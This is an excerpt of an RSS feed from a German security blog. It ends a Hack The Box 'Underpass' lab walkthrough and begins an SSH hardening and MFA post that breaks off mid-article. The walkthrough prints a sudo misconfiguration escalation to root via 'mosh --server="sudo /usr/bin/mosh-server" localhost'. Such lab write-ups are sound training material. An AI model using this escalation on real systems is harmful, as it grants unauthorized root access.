+    &lt;a href=&#34;#rechteerweiterung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Rechteerweiterung
+&lt;/h2&gt;
+&lt;p&gt;Mit einem ersten interaktiven Zugang zum Server möchte ich nun natürlich weitere Rechte auf dem Server bekommen. Dafür lohnt sich erst ein Blick auf &lt;code&gt;sudo&lt;/code&gt;. Damit kann ich Befehle mit erweiterten Berechtigungen ausführen.&lt;/p&gt;
+&lt;h3 id=&#34;was-darf-svcmosh&#34;&gt;
+    &lt;a href=&#34;#was-darf-svcmosh&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Was darf svcMosh?
+&lt;/h3&gt;
+&lt;p&gt;Um Informationen darüber zu bekommen, ob &lt;code&gt;svcMosh&lt;/code&gt; Befehle mit erweiterten Berechtigungen ausführen kann, führe ich den folgenden Befehl aus.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Das Ergebnis kann sich sehen lassen.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-11.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Der Befehl &lt;code&gt;/usr/bin/mosh-server&lt;/code&gt; darf vom Benutzer &lt;code&gt;svcMosh&lt;/code&gt; ohne weitere Hürden ausgeführt werden.&lt;/p&gt;
+&lt;h3 id=&#34;mosh&#34;&gt;
+    &lt;a href=&#34;#mosh&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Mosh
+&lt;/h3&gt;
+&lt;p&gt;Welche Informationen gibt es zu Mosh?&lt;/p&gt;
+&lt;h4 id=&#34;was-ist-mosh&#34;&gt;
+    &lt;a href=&#34;#was-ist-mosh&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Was ist Mosh?
+&lt;/h4&gt;
+&lt;p&gt;Ein kurzer Blick auf die Webseite des Produkts&lt;sup id=&#34;fnref:7&#34;&gt;&lt;a href=&#34;#fn:7&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;7&lt;/a&gt;&lt;/sup&gt; beantwortet die Frage schnell:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Mosh&lt;/p&gt;
+&lt;p&gt;(mobile shell)&lt;/p&gt;
+&lt;p&gt;Remote terminal application that allows roaming, supports intermittent connectivity, and provides intelligent local echo and line editing of user keystrokes.&lt;/p&gt;
+&lt;p&gt;Mosh is a replacement for interactive SSH terminals. It&amp;rsquo;s more robust and responsive, especially over Wi-Fi, cellular, and long-distance links.&lt;/p&gt;
+&lt;p&gt;Mosh is free software, available for GNU/Linux, BSD, macOS, Solaris, Android, Chrome, and iOS.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Es handelt sich also um eine Verwaltungskonsole ähnlich SSH. Und diese darf der Benutzer &lt;code&gt;svcMosh&lt;/code&gt; mit erweiterten Berechtigungen ausführen.&lt;/p&gt;
+&lt;h4 id=&#34;konfigurationsfehler-ausnutzen&#34;&gt;
+    &lt;a href=&#34;#konfigurationsfehler-ausnutzen&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Konfigurationsfehler ausnutzen
+&lt;/h4&gt;
+&lt;p&gt;Nach der Recherche zu Mosh wird schnell klar, dass es keine gute Idee ist, dem Benutzer &lt;code&gt;svcMosh&lt;/code&gt; zu gestatten, diese Applikation mit &lt;code&gt;sudo&lt;/code&gt; auszuführen.&lt;/p&gt;
+&lt;p&gt;Ein wenig Recherche auf der Webseite bringt zu Tage, dass man den &lt;code&gt;mosh-server&lt;/code&gt; quasi überall speichern und ausführen kann. Die Frage lautet: Auch mit &lt;code&gt;sudo&lt;/code&gt;?&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-12.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Tatsächlich ist die Frage schnell zu beantworten: Ja.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mosh --server&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sudo /usr/bin/mosh-server&amp;#34;&lt;/span&gt; localhost
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Dieser Befehl führt den Mosh-Server mit erweiterten Berechtigungen aus und stellt eine Verbindung her. Dort habe ich sofort &lt;code&gt;root&lt;/code&gt;-Rechte.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-13.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&#34;root-flag&#34;&gt;
+    &lt;a href=&#34;#root-flag&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Root Flag
+&lt;/h3&gt;
+&lt;p&gt;Die Root-Flag ist damit auch sehr schnell gefunden.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-14.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;zusammenfassung&#34;&gt;
+    &lt;a href=&#34;#zusammenfassung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Zusammenfassung
+&lt;/h2&gt;
+&lt;p&gt;Die Maschine &lt;strong&gt;Underpass&lt;/strong&gt; bietet eine spannende und lehrreiche Herausforderung, die eine sorgfältige Erkundung und Analyse erfordert. Besonders hervorzuheben ist die Bedeutung eines umfassenden Scans, einschließlich UDP-Ports, um versteckte Dienste wie SNMP aufzudecken. Die weitere Analyse zeigt, wie man durch gezielte Recherche und das Verständnis von Diensten wie &lt;strong&gt;daloRADIUS&lt;/strong&gt; und &lt;strong&gt;Mosh&lt;/strong&gt; Sicherheitslücken effektiv ausnutzen kann.&lt;/p&gt;
+&lt;p&gt;Die Rechteerweiterung basiert auf einer Konfigurationsschwachstelle, die zeigt, wie gefährlich es ist, Anwendungen mit erweiterten Berechtigungen auszuführen. Gleichzeitig bleibt der Schwierigkeitsgrad zugänglich, da keine komplexen Angriffsmethoden notwendig sind.&lt;/p&gt;
+&lt;p&gt;Insgesamt bietet Underpass eine großartige Gelegenheit, die eigene Methodik zu verfeinern und dabei wichtige Prinzipien der IT-Sicherheit zu lernen. Für Anfänger eine lohnenswerte Erfahrung!&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/xenophil90/shell-scripts/blob/main/fast-nmap.sh&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://github.com/xenophil90/shell-scripts/blob/main/fast-nmap.sh&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.daloradius.com&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://www.daloradius.com&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/lirantal/daloradius&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://github.com/lirantal/daloradius&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:4&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/lirantal/daloradius/blob/master/doc/install/INSTALL&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://github.com/lirantal/daloradius/blob/master/doc/install/INSTALL&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:4&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:5&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/lirantal/daloradius/tree/master/app/operators&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://github.com/lirantal/daloradius/tree/master/app/operators&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:5&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:6&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://gchq.github.io/CyberChef/&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:6&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:7&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://mosh.org&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://mosh.org&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:7&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+    </description>
+    </item>
+    
+    <item>
+    <title>SSH-Zugang mithilfe von Multi-Faktor-Authentifizierung absichern</title>
+    <link>https://xenophil90.github.io/posts/2025/totp-mit-ssh-in-ubuntu-24.04-nutzen/</link>
+    <pubDate>Sun, 12 Jan 2025 09:00:00 +0100</pubDate>
+    <author>Phil Krämer</author>
+    <guid>https://xenophil90.github.io/posts/2025/totp-mit-ssh-in-ubuntu-24.04-nutzen/</guid>
+    <description>
+        &lt;h2 id=&#34;fernzugriff-mithilfe-von-ssh&#34;&gt;
+    &lt;a href=&#34;#fernzugriff-mithilfe-von-ssh&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Fernzugriff mithilfe von SSH
+&lt;/h2&gt;
+&lt;p&gt;SSH (Secure Shell) ist ein Protokoll, das eine verschlüsselte Kommunikation zwischen zwei Geräten ermöglicht. Es wird häufig verwendet, um entfernte Server sicher zu administrieren oder Dateien zu übertragen&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;passwort-oder-schlüssel&#34;&gt;
+    &lt;a href=&#34;#passwort-oder-schl%c3%bcssel&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Passwort oder Schlüssel?
+&lt;/h2&gt;
+&lt;p&gt;Um sich als Benutzer gegenüber einem SSH-Server auszuweisen, gibt es verschiedene Möglichkeiten. Zugang erhält nur, wer sich erfolgreich authentifiziert – der Umfang der Zugriffsrechte hängt von den vergebenen Berechtigungen ab.&lt;/p&gt;
+&lt;p&gt;Die gängigsten Möglichkeiten der Authentifizierung sind im Folgenden aufgelistet.&lt;/p&gt;
+&lt;h3 id=&#34;passwortauthentifizierung&#34;&gt;
+    &lt;a href=&#34;#passwortauthentifizierung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Passwortauthentifizierung
+&lt;/h3&gt;
+&lt;p&gt;Benutzer geben einen Benutzernamen und ein Passwort ein, um sich anzumelden. Diese Methode ist einfach, jedoch anfällig für Brute-Force-Angriffe, insbesondere wenn schwache Passwörter verwendet werden.&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Vorteil&lt;/th&gt;
+          &lt;th&gt;Nachteil&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Keine zusätzliche Einrichtung erforderlich.&lt;/td&gt;
+          &lt;td&gt;Weniger sicher, besonders bei wiederverwendeten oder leicht zu erratenden Passwörtern.&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;schlüsselbasierte-authentifizierung&#34;&gt;
+    &lt;a href=&#34;#schl%c3%bcsselbasierte-authentifizierung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Schlüsselbasierte Authentifizierung
+&lt;/h3&gt;
+&lt;p&gt;Diese Methode verwendet ein Schlüsselpaar aus einem privaten und einem öffentlichen Schlüssel. Der öffentliche Schlüssel wird auf dem Server gespeichert, während der private Schlüssel lokal bleibt. Nur der Besitzer des privaten Schlüssels kann sich anmelden.&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Vorteil&lt;/th&gt;
+          &lt;th&gt;Nachteil&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Sehr sicher, insbesondere wenn der private Schlüssel mit einem starken Passwort geschützt ist.&lt;/td&gt;
+          &lt;td&gt;Die Schlüssel müssen sicher aufbewahrt werden, da ein gestohlener Schlüssel direkten Zugriff ermöglicht.&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;multi-factor-authentication-mfa&#34;&gt;
+    &lt;a href=&#34;#multi-factor-authentication-mfa&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Multi-Factor Authentication (MFA)
+&lt;/h2&gt;
+&lt;p&gt;Zusätzlich zu einer der oben genannten Methoden wird ein weiterer Faktor wie ein Einmalcode (OTP) oder ein Hardware-Token benötigt. Auch ein biometrischer Faktor (Fingerabdruck, Retina-Scan, etc.) ist denkbar.&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Vorteil&lt;/th&gt;
+          &lt;th&gt;Nachteil&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Hohe Sicherheit, selbst wenn ein Passwort oder Schlüssel kompromittiert wird.&lt;/td&gt;
+          &lt;td&gt;Erfordert zusätzliche Software oder Hardware.&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;typische-risiken-beim-einsatz-von-ssh&#34;&gt;
+    &lt;a href=&#34;#typische-risiken-beim-einsatz-von-ssh&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Typische Risiken beim Einsatz von SSH
+&lt;/h2&gt;
+&lt;p&gt;Obwohl SSH als technisch sicher gilt, gibt es Risiken, wenn es nicht richtig eingerichtet oder nicht regelmäßig aktualisiert wird. Dazu gehören u. a.:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Brute-Force- oder Wörterbuch-Angriffe&lt;/strong&gt;: Angreifer versuchen, durch systematisches Ausprobieren von Benutzername-Passwort-Kombinationen Zugriff zu erlangen.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Schwache Passwörter&lt;/strong&gt;: Einfache oder mehrfach verwendete Passwörter erhöhen das Risiko eines erfolgreichen Angriffs.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Gestohlene Schlüssel&lt;/strong&gt;: Wenn ein privater SSH-Schlüssel kompromittiert wird, können Angreifer ohne weitere Authentifizierung Zugriff erhalten.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Veraltete Software&lt;/strong&gt;: Ältere Versionen von SSH-Servern können Sicherheitslücken enthalten, die von Angreifern ausgenutzt werden können.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Fehlerhafte Konfiguration&lt;/strong&gt;: Fehlerhafte Konfiguration kann dazu führen, dass ein Angriff Erfolg hat. Hierzu zählen beispielsweise die Nutzung alter kryptografischer Verfahren oder das Gestatten der Anmeldung als &lt;code&gt;root&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;wie-man-sich-sicher-an-einem-ssh-server-anmeldet&#34;&gt;
